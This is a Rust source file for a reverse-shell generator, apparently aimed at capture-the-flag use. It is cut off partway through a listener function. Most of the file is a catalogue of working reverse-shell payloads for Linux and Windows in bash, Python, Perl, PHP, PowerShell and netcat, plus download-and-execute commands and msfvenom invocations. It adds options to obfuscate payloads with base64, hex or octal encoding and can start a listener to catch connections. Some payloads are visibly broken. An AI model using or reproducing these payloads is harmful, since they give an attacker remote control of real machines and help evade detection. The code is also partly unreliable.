use colored::{Color, Colorize};
use serde::{Deserialize, Serialize};
use std::{
    collections::HashSet,
    fmt,
    fs,
    io::{self, Write},
    net::UdpSocket,
    process::Command,
    str::FromStr,
};

use base64::Engine;

#[cfg(feature = "clipboard")]
use clipboard::{ClipboardContext, ClipboardProvider};

const BANNER: &str = r#"
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                        Remade in Rust for CTF Use
"#;

fn display_fancy_banner() {
    println!("\n{}", BANNER.cyan().bold());
    println!("{}", "=".repeat(100).blue());
    println!("{}", "           A Superior Reverse Shell Generator written in Rust - Fast, Safe & Feature-Rich".cyan().bold());
    println!("{}", "=".repeat(100).blue());
    println!();
}

fn display_main_menu_help() {
    println!("{}", "\n┌─[ Quick Start Guide ]────────────────────────────────────────────────┐".blue());
    println!("{}", format!("│ {: <70} │", "Quick Start Guide:").blue().bold());
    println!("{}", format!("│ {: <70} │", "").blue());
    println!("{}", format!("│ {: <70} │", "[1] Generate Linux shells  - Generate various Linux reverse shells").yellow());
    println!("{}", format!("│ {: <70} │", "[2] Generate Windows shells  - Generate various Windows reverse shells").yellow());
    println!("{}", format!("│ {: <70} │", "[3] Reconfigure IP/Port      - Change your IP address or port settings").yellow());
    println!("{}", format!("│ {: <70} │", "[4] Start Listener           - Start a listener to catch reverse shells").yellow());
    println!("{}", format!("│ {: <70} │", "[5] Configure Listener       - Choose between built-in or netcat listener").yellow());
    println!("{}", format!("│ {: <70} │", "[6] Save Current Config      - Save your current settings for later").yellow());
    println!("{}", format!("│ {: <70} │", "[7] Load Config              - Load previously saved settings").yellow());
    println!("{}", format!("│ {: <70} │", "[8] Exit                     - Exit the application").yellow());
    println!("{}", "└────────────────────────────────────────────────────────────────────┘".blue());
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
enum OsType {
    Linux,
    Windows,
}


impl fmt::Display for OsType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            OsType::Linux => write!(f, "Linux"),
            OsType::Windows => write!(f, "Windows"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum ObfuscationType {
    None,
    Base64,
    BashHex,
    BashOctal,
    StringSplitting,
}

#[derive(Debug, Clone)]
enum PayloadTemplate {
    Static(&'static str),
    PythonBase64 { script: &'static str },
}

impl PayloadTemplate {
    fn render(&self, config: &Config) -> String {
        // Ensure the IP and port have been properly validated before rendering
        // This is a defensive check
        let sanitized_ip = &config.active_ip;
        let sanitized_port = config.port.to_string();

        match self {
            PayloadTemplate::Static(template) => template
                .replace("{ip}", sanitized_ip)
                .replace("{port}", &sanitized_port),
            PayloadTemplate::PythonBase64 { script } => {
                let script = script
                    .replace("{ip}", sanitized_ip)
                    .replace("{port}", &sanitized_port);
                let encoded = base64::engine::general_purpose::STANDARD.encode(script);
                format!(
                    "python3 -c \"import base64,os,socket,pty; exec(base64.b64decode('{}').decode())\"",
                    encoded
                )
            }
        }
    }

    fn render_with_obfuscation(&self, config: &Config, obfuscation: &ObfuscationType) -> String {
        let basic_payload = self.render(config);
        match obfuscation {
            ObfuscationType::None => basic_payload,
            ObfuscationType::Base64 => {
                let encoded = base64::engine::general_purpose::STANDARD.encode(&basic_payload);
                format!("echo {} | base64 -d | bash", encoded)
            },
            ObfuscationType::BashHex => {
                // Convert to hex representation
                let hex_payload: String = basic_payload
                    .chars()
                    .map(|c| format!("\\x{:02x}", c as u8))
                    .collect();
                format!("bash -c \"{}\"", hex_payload)
            },
            ObfuscationType::BashOctal => {
                // Convert to octal representation
                let oct_payload: String = basic_payload
                    .chars()
                    .map(|c| format!("\\{:03o}", c as u8))
                    .collect();
                format!("bash -c \"{}\"", oct_payload)
            },
            ObfuscationType::StringSplitting => {
                // Split string into chunks
                let chunks: Vec<String> = basic_payload
                    .chars()
                    .collect::<Vec<_>>()
                    .chunks(5)
                    .map(|chunk| chunk.iter().collect())
                    .collect();
                let chunk_str = chunks.join("\")$(\"");
                format!("eval \"{}\"", chunk_str)
            }
        }
    }
}

#[derive(Debug, Clone)]
struct ShellPayload {
    name: &'static str,
    lang: &'static str,
    os: OsType,
    template: PayloadTemplate,
}

#[derive(Debug, Clone)]
struct RenderedPayload {
    name: &'static str,
    lang: &'static str,
    os: OsType,
    payload: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
enum ListenerType {
    BuiltIn,
    Netcat,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Config {
    local_ip: String,
    public_ip: String,
    active_ip: String,
    active_ip_type: String,
    port: u16,
    listener_type: ListenerType,
}

fn get_all_payloads() -> Vec<ShellPayload> {
    vec![
        // Linux payloads
        ShellPayload {
            name: "Bash TCP #1",
            lang: "bash",
            os: OsType::Linux,
            template: PayloadTemplate::Static("bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
        },
        ShellPayload {
            name: "Bash TCP #2",
            lang: "bash",
            os: OsType::Linux,
            template: PayloadTemplate::Static("0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"),
        },
        ShellPayload {
            name: "Bash UDP",
            lang: "bash",
            os: OsType::Linux,
            template: PayloadTemplate::Static("sh -i >& /dev/udp/{ip}/{port} 0>&1"),
        },
        ShellPayload {
            name: "Bash TCP #4 (Read/Write)",
            lang: "bash",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done",
            ),
        },
        ShellPayload {
            name: "Python #1",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::Static("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
        },
        ShellPayload {
            name: "Python #2",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::Static("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"),
        },
        ShellPayload {
            name: "Python #3",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::Static("python -c \"import sys,base64exec(base64.b64decode({b64payload}))\""),
        },
        ShellPayload {
            name: "Python #4 (Base64 Encoded)",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::PythonBase64 {
                script: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);",
            },
        },
        ShellPayload {
            name: "Python #5 (Base64 Encoded)",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::PythonBase64 {
                script: "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')",
            },
        },
        ShellPayload {
            name: "Perl #1",
            lang: "perl",
            os: OsType::Linux,
            template: PayloadTemplate::Static("perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"),
        },
        ShellPayload {
            name: "Perl #2",
            lang: "perl",
            os: OsType::Linux,
            template: PayloadTemplate::Static("perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");shutdown(S,2);};'"),
        },
        ShellPayload {
            name: "Perl #3 (Base64 Encoded)",
            lang: "perl",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "perl -MMIME::Base64 -e 'eval(decode_base64(\"dXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjYXBpZSIpKTtpZihjb25uZWN0KFMsc29ja2FkZF9pbihKcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RJT1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307\"))'",
            ),
        },
        ShellPayload {
            name: "Socat #1",
            lang: "socat",
            os: OsType::Linux,
            template: PayloadTemplate::Static("socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"),
        },
        ShellPayload {
            name: "Socat #2",
            lang: "socat",
            os: OsType::Linux,
            template: PayloadTemplate::Static("socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"),
        },
        ShellPayload {
            name: "Socat #3 (TTY Upgrade)",
            lang: "socat",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
            ),
        },
        ShellPayload {
            name: "PHP #1",
            lang: "php",
            os: OsType::Linux,
            template: PayloadTemplate::Static("php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        },
        ShellPayload {
            name: "PHP #2",
            lang: "php",
            os: OsType::Linux,
            template: PayloadTemplate::Static("php -r '$s=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        },
        ShellPayload {
            name: "PHP #3",
            lang: "php",
            os: OsType::Linux,
            template: PayloadTemplate::Static("php -r '$s=fsockopen(\"{ip}\",{port});`/bin/sh -i <&3 >&3 2>&3`;`/bin/sh -i <&3 >&3 2>&3`;'"),
        },
        ShellPayload {
            name: "Rust (Simple TCP Client)",
            lang: "rust",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "RUST_CODE: use std::net::TcpStream; use std::process::Command; if let Ok(stream) = TcpStream::connect(\"{ip}:{port}\") { let _ = Command::new(\"/bin/sh\").stdin(stream.try_clone().unwrap()).stdout(stream.try_clone().unwrap()).stderr(stream).spawn(); }",
            ),
        },
        ShellPayload {
            name: "Ruby #1",
            lang: "ruby",
            os: OsType::Linux,
            template: PayloadTemplate::Static("ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
        },
        ShellPayload {
            name: "Ruby #2",
            lang: "ruby",
            os: OsType::Linux,
            template: PayloadTemplate::Static("ruby -rsocket -e'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"),
        },
        ShellPayload {
            name: "Lua Linux",
            lang: "lua",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            ),
        },
        ShellPayload {
            name: "Zsh",
            lang: "zsh",
            os: OsType::Linux,
            template: PayloadTemplate::Static(
                "zmodload zsh/net/tcp && ztcp {ip} {port} && while read line; do $line 2>&3 >&3; done",
            ),
        },
        ShellPayload {
            name: "Java #1",
            lang: "java",
            os: OsType::Linux,
            template: PayloadTemplate::Static("r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]);"),
        },
        ShellPayload {
            name: "Java #2",
            lang: "java",
            os: OsType::Linux,
            template: PayloadTemplate::Static("import java.io.*;import java.net.*;public class RevShell{public static void main(String[] args)throws Exception{Socket s=new Socket(\"{ip}\", {port});Process p=Runtime.getRuntime().exec(\"/bin/sh\");s.getInputStream(),p.getOutputStream());}}"),
        },
        ShellPayload {
            name: "NodeJS",
            lang: "nodejs",
            os: OsType::Linux,
            template: PayloadTemplate::Static("require('child_process').exec('nc -e /bin/sh {ip} {port}')"),
        },
        ShellPayload {
            name: "Ncat (Reverse Shell)",
            lang: "nc",
            os: OsType::Linux,
            template: PayloadTemplate::Static("nc {ip} {port} -e /bin/sh"),
        },
        ShellPayload {
            name: "Ncat (Named Pipe)",
            lang: "nc",
            os: OsType::Linux,
            template: PayloadTemplate::Static("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"),
        },
        ShellPayload {
            name: "Awk",
            lang: "awk",
            os: OsType::Linux,
            template: PayloadTemplate::Static("awk 'BEGIN {s=\"/inet/tcp/0/{ip}/{port}\";while(42){do{printf \"shell>\";fflush();gets}s|& getline cmd;if(cmd){system(cmd);close(cmd)}}}'"),
        },
        ShellPayload {
            name: "Gawk",
            lang: "gawk",
            os: OsType::Linux,
            template: PayloadTemplate::Static("gawk 'BEGIN {s=\"/inet/tcp/0/{ip}/{port}\";while(42){do{printf \"shell>\";fflush();gets}s|& getline cmd;if(cmd){system(cmd);close(cmd)}}}'"),
        },
        ShellPayload {
            name: "Go",
            lang: "go",
            os: OsType::Linux,
            template: PayloadTemplate::Static("echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();}' > /tmp/t.go && go run /tmp/t.go"),
        },
        // Windows payloads
        ShellPayload {
            name: "PowerShell #1",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"),
        },
        ShellPayload {
            name: "PowerShell #2 (Base64)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static("powershell -e [Base64Payload]"),
        },
        ShellPayload {
            name: "PowerShell #3 (Shortest)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "$s=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$st=$s.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sd=[text.encoding]::ASCII.GetBytes($sb2);$st.Write($sd,0,$sd.Length);$st.Flush()};$s.Close()",
            ),
        },
        ShellPayload {
            name: "PowerShell #4 (IEX Download)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/script.ps1')\""),
        },
        ShellPayload {
            name: "PowerShell #5 (Encoded Command)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static("powershell -nop -win hidden -enc [Base64EncodedCommand]"),
        },
        ShellPayload {
            name: "Certutil/PowerShell (Download/Execute)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "certutil -urlcache -f http://{ip}/rev.ps1 %temp%\\rev.ps1; powershell -exec bypass %temp%\\rev.ps1",
            ),
        },
        ShellPayload {
            name: "Netcat Windows",
            lang: "cmd",
            os: OsType::Windows,
            template: PayloadTemplate::Static("nc.exe -e cmd.exe {ip} {port}"),
        },
        ShellPayload {
            name: "Ncat Windows",
            lang: "cmd",
            os: OsType::Windows,
            template: PayloadTemplate::Static("ncat.exe -e cmd.exe {ip} {port}"),
        },
        ShellPayload {
            name: "PowerShell with cmd.exe",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static("powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/script.ps1')\""),
        },
        ShellPayload {
            name: "VBScript",
            lang: "vbs",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "VBS_FILE: Set objShell = CreateObject(\"WScript.Shell\") : Set objExec = objShell.Exec(\"cmd.exe /c powershell -enc [BASE64_PAYLOAD]\")",
            ),
        },
        ShellPayload {
            name: "C# (Simple)",
            lang: "c#",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "C#_CODE: using System.Net.Sockets; using System.Diagnostics; using System.Text; TcpClient client = new TcpClient(\"{ip}\", {port}); NetworkStream stream = client.GetStream(); Process process = new Process(); process.StartInfo.FileName = \"cmd.exe\"; process.StartInfo.UseShellExecute = false; process.StartInfo.RedirectStandardInput = true; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.Start(); stream.Write(Encoding.ASCII.GetBytes(\"Hello\\n\")); while(true) { if (stream.DataAvailable) { byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); process.StandardInput.WriteLine(Encoding.ASCII.GetString(buffer, 0, bytesRead)); } else if (process.StandardOutput.Peek() != -1) { stream.Write(Encoding.ASCII.GetBytes(process.StandardOutput.ReadToEnd())); } else if (process.StandardError.Peek() != -1) { stream.Write(Encoding.ASCII.GetBytes(process.StandardError.ReadToEnd())); } }",
            ),
        },
        ShellPayload {
            name: "C# (Minimal)",
            lang: "c#",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "using System;using System.Net.Sockets;using System.IO;class RevShell{static void Main(){TcpClient c=new TcpClient(\"{ip}\",{port});Stream s=c.GetStream();while(true){int l=0;byte[] b=new byte[1024];l=s.Read(b,0,b.Length);string cmd=System.Text.Encoding.Default.GetString(b,0,l);System.Diagnostics.Process proc=new System.Diagnostics.Process();proc.StartInfo.FileName=\"cmd.exe\";proc.StartInfo.Arguments=\"/c \" + cmd;proc.StartInfo.UseShellExecute=false;proc.StartInfo.RedirectStandardOutput=true;proc.StartInfo.RedirectStandardError=true;proc.Start();StreamWriter sw=proc.StandardInput;sw.Write(cmd);sw.Close();string output=proc.StandardOutput.ReadToEnd()+proc.StandardError.ReadToEnd();byte[] outputBytes=System.Text.Encoding.Default.GetBytes(output);s.Write(outputBytes,0,outputBytes.Length);}}}",
            ),
        },
        ShellPayload {
            name: "Python Windows",
            lang: "python",
            os: OsType::Windows,
            template: PayloadTemplate::Static("python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['cmd.exe','-i']);\""),
        },
        ShellPayload {
            name: "JavaScript (JScript)",
            lang: "js",
            os: OsType::Windows,
            template: PayloadTemplate::Static("cscript //nologo c:\\test\\rev.js"),
        },
        ShellPayload {
            name: "C++ Payload",
            lang: "cpp",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "#include <winsock2.h>#include <windows.h>int main(){WSADATA wsaData;SOCKET sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);struct sockaddr_in addr;addr.sin_family=AF_INET;addr.sin_port=htons({port});addr.sin_addr.s_addr=inet_addr(\"{ip}\");connect(sock,(SOCKADDR*)&addr,sizeof(addr));STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);si.dwFlags=STARTF_USESTDHANDLES;si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)sock;TCHAR cmd[]=TEXT(\"cmd.exe\");CreateProcess(NULL,cmd,NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);return 0;}"
            ),
        },
        ShellPayload {
            name: "HTA (HTML Application)",
            lang: "hta",
            os: OsType::Windows,
            template: PayloadTemplate::Static(
                "<script src=\"http://{ip}/shellcode.js\"></script>"
            ),
        },
        ShellPayload {
            name: "MSFVENOM PHP Meterpreter",
            lang: "php",
            os: OsType::Linux,
            template: PayloadTemplate::Static("msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o shell.php"),
        },
        ShellPayload {
            name: "MSFVENOM Python",
            lang: "python",
            os: OsType::Linux,
            template: PayloadTemplate::Static("msfvenom -p python/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o shell.py"),
        },
        ShellPayload {
            name: "MSFVENOM Windows Meterpreter (EXE)",
            lang: "exe",
            os: OsType::Windows,
            template: PayloadTemplate::Static("msfvenom -p windows/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe"),
        },
        ShellPayload {
            name: "MSFVENOM Windows Meterpreter (Powershell)",
            lang: "powershell",
            os: OsType::Windows,
            template: PayloadTemplate::Static("msfvenom -p windows/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f psh -o shell.ps1"),
        },
        ShellPayload {
            name: "MSFVENOM Windows Shell (EXE)",
            lang: "exe",
            os: OsType::Windows,
            template: PayloadTemplate::Static("msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o shell.exe"),
        },
    ]
}

fn get_local_ip() -> String {
    match UdpSocket::bind("0.0.0.0:0") {
        Ok(socket) => match socket.connect("8.8.8.8:80") {
            Ok(_) => socket
                .local_addr()
                .map(|addr| addr.ip().to_string())
                .unwrap_or_else(|_| "127.0.0.1".to_string()),
            Err(_) => "127.0.0.1".to_string(),
        },
        Err(_) => "127.0.0.1".to_string(),
    }
}

fn get_public_ip() -> String {
    // Try to get public IP from multiple services
    // Using fixed, known-safe URLs to prevent command injection
    let urls = [
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ident.me",
        "https://ipecho.net/plain",
    ];

    for url in &urls {
        // Validate URL before using it (ensure it's a safe, expected format)
        if !url.starts_with("https://") ||
           !(url.contains("ipify.org") || url.contains("icanhazip.com") ||
             url.contains("ident.me") || url.contains("ipecho.net")) {
            continue; // Skip invalid URLs
        }

        if let Ok(response) = std::process::Command::new("curl")
            .arg("-s")
            .arg("--max-time")
            .arg("5")
            .arg(url)
            .output()
        {
            if response.status.success() {
                let ip = String::from_utf8_lossy(&response.stdout).trim().to_string();
                if !ip.is_empty() && validate_ip(&ip).is_ok() {
                    return ip;
                }
            }
        }
    }

    // If curl fails, use a fallback method
    "0.0.0.0 (External IP Not Available)".to_string()
}

fn get_input(prompt: &str) -> String {
    print!("{}", prompt.magenta().bold());
    let _ = io::stdout().flush();
    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .map(|_| input.trim().to_string())
        .unwrap_or_default()
}

fn select_obfuscation_type() -> ObfuscationType {
    loop {
        clear_screen();
        display_banner();
        println!("\n{}", "[*] SELECT OBFUSCATION TYPE".cyan().bold());
        println!("{}", "─".repeat(80).bold());
        println!("  {} No obfuscation", "[1]".green());
        println!("  {} Base64 encoding", "[2]".green());
        println!("  {} Bash hex encoding", "[3]".green());
        println!("  {} Bash octal encoding", "[4]".green());
        println!("  {} String splitting", "[5]".green());
        println!("{}", "─".repeat(80).bold());

        let choice = get_input("Select obfuscation (1-5): ");

        match choice.as_str() {
            "1" => return ObfuscationType::None,
            "2" => return ObfuscationType::Base64,
            "3" => return ObfuscationType::BashHex,
            "4" => return ObfuscationType::BashOctal,
            "5" => return ObfuscationType::StringSplitting,
            _ => {
                println!("{}", "[!] Invalid choice. Please select 1-5".red());
                let _ = get_input("\nPress Enter to continue...");
            }
        }
    }
}

fn save_config(config: &Config) -> Result<(), String> {
    let config_path = "revshell_config.json";
    let config_json = serde_json::to_string_pretty(config)
        .map_err(|e| format!("Failed to serialize config: {}", e))?;

    fs::write(config_path, config_json)
        .map_err(|e| format!("Failed to write config file: {}", e))?;

    Ok(())
}

fn load_config() -> Option<Config> {
    let config_path = "revshell_config.json";

    if let Ok(config_json) = fs::read_to_string(config_path) {
        if let Ok(config) = serde_json::from_str::<Config>(&config_json) {
            return Some(config);
        }
    }

    None
}

fn validate_ip(ip: &str) -> Result<(), String> {
    // Additional validation to prevent shell metacharacters
    if ip.contains(|c: char| !matches!(c, '0'..='9' | '.')) {
        return Err("IP contains invalid characters".to_string());
    }

    std::net::Ipv4Addr::from_str(ip)
        .map(|_| ())
        .map_err(|_| "Invalid IP address format".to_string())
}

fn validate_port(port: u16) -> Result<(), String> {
    if (1..=65535).contains(&port) {
        Ok(())
    } else {
        Err("Port must be between 1 and 65535".to_string())
    }
}

fn clear_screen() {
    if cfg!(target_os = "windows") {
        let _ = Command::new("cmd").args(["/c", "cls"]).status();
    } else {
        let _ = Command::new("clear").status();
    }
}

fn render_payloads(
    all_shells: &[ShellPayload],
    os_type: OsType,
    language: Option<&str>,
    limit: Option<usize>,
    config: &Config,
    obfuscation: ObfuscationType,
) -> Vec<RenderedPayload> {
    let mut payloads: Vec<RenderedPayload> = all_shells
        .iter()
        .filter(|payload| payload.os == os_type)
        .filter(|payload| language.map_or(true, |lang| payload.lang.eq_ignore_ascii_case(lang)))
        .map(|payload| RenderedPayload {
            name: payload.name,
            lang: payload.lang,
            os: payload.os,
            payload: if obfuscation == ObfuscationType::None {
                payload.template.render(config)
            } else {
                payload.template.render_with_obfuscation(config, &obfuscation)
            },
        })
        .collect();

    if let Some(limit) = limit {
        payloads.truncate(limit);
    }

    payloads
}

fn start_listener(config: &Config) {
    match config.listener_type {
        ListenerType::BuiltIn => {
            println!("\n{}", "[*] Starting built-in listener...".green().bold());
            println!("{}", format!("[*] Waiting for connection on port {}...\n", config.port).green().bold());

            let runtime = tokio::runtime::Runtime::new().expect("Failed to create async runtime");
            runtime.block_on(async move {
                if let Err(e) = start_builtin_listener_async(config.port).await {
                    println!("{}", format!("[!] Error starting listener: {}", e).red().bold());
                    println!("{}", format!("[*] Command to run manually: nc -lvnp {}", config.port).yellow());
                }
            });
        }
        ListenerType::Netcat => {
            println!("\n{}", "[*] Starting netcat listener...".green().bold());
            println!("{}", "[*] Waiting for connection...\n".green().bold());

            let mut command = std::process::Command::new("nc");
            command.args(["-lvnp", &config.port.to_string()]);

            match command.status() {
                Ok(status) if status.success() => {}
                Ok(_) => {
                    let mut ncat_command = std::process::Command::new("ncat");
                    ncat_command.args(["-lvnp", &config.port.to_string()]);

                    match ncat_command.status() {
                        Ok(ncat_status) if ncat_status.success() => {}
                        Ok(_) => println!(
                            "{}",
                            "[!] Error: Listener failed to start with nc or ncat."
                                .red()
                                .bold()
                        ),
                        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
                            println!(
                                "{}",
                                "[!] Error: netcat (nc) or ncat not found. Please install a listener tool."
                                    .red()
                                    .bold()
                            );
                            println!(
                                "{}",
                                format!("[*] Command to run manually: nc -lvnp {}", config.port).yellow()
                            );
                        }
                        Err(_) => println!(
                            "{}",
                            "[!] Error: ncat listener failed to start.".red().bold()
                        ),
                    }
                }
                Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
                    println!(
                        "{}",
                        "[!] Error: netcat (nc) not found. Trying 'ncat'."
                            .red()
                            .bold()
                    );
                    let mut ncat_command = std::process::Command::new("ncat");
                    ncat_command.args(["-lvnp", &config.port.to_string()]);

                    match ncat_command.status() {
                        Ok(ncat_status) if ncat_status.success() => {}
                        Ok(_) => println!(
                            "{}",
                            "[!] Error: Listener failed to start with nc or ncat."
                                .red()
                                .bold()
                        ),
                        Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
                            println!(
                                "{}",
                                "[!] Error: netcat (nc) or ncat not found. Please install a listener tool."
                                    .red()
                                    .bold()
                            );
                            println!(
                                "{}",
                                format!("[*] Command to run manually: nc -lvnp {}", config.port).yellow()
                            );
                        }
                        Err(_) => println!(
                            "{}",
                            "[!] Error: ncat listener failed to start.".red().bold()
                        ),
                    }
                }
                Err(_) => println!(
                    "{}",
                    "[!] Error: Listener process failed to start.".red().bold()
                ),
            }
        }
    }

    println!("\n{}", "[*] Listener stopped".yellow());
}

async fn start_builtin_listener_async(port: u16) -> Result<(), Box<dyn std::error::Error>> {
    use tokio::net::TcpListener;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::sync::mpsc;

    let listener = TcpListener::bind(format!("0.0.0.0:{}", port)).await?;
